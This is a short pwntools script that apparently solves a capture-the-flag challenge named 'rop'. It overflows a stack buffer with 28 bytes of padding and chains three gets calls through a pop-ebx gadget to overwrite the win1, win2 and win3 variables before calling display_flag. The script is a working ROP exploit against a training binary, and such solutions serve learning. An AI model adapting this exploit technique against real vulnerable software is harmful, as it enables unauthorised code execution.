#!/usr/bin/env python2

from pwn import *

elf = ELF('./rop')
p = process('./rop')

win1 = elf.symbols['win1']
win2 = elf.symbols['win2']
win3 = elf.symbols['win3']
gets = elf.plt['gets']
pop_ebx = 0x08048409
display_flag = elf.symbols['display_flag']

p.recv()

# just call gets on each variable and overwrite lmao
payload = 'A'*28
payload += p32(gets)
payload += p32(pop_ebx)
payload += p32(win1)

payload += p32(gets)
payload += p32(pop_ebx)
payload += p32(win2)

payload += p32(gets)
payload += p32(pop_ebx)
payload += p32(win3)

# Finally, call display_flag
payload += p32(display_flag)
payload += p32(0xdeadbeef)

p.sendline(payload)
p.sendline('A') # overwrite win1
p.sendline('A') # overwrite win2
p.sendline('A') # overwrite win3

p.interactive()
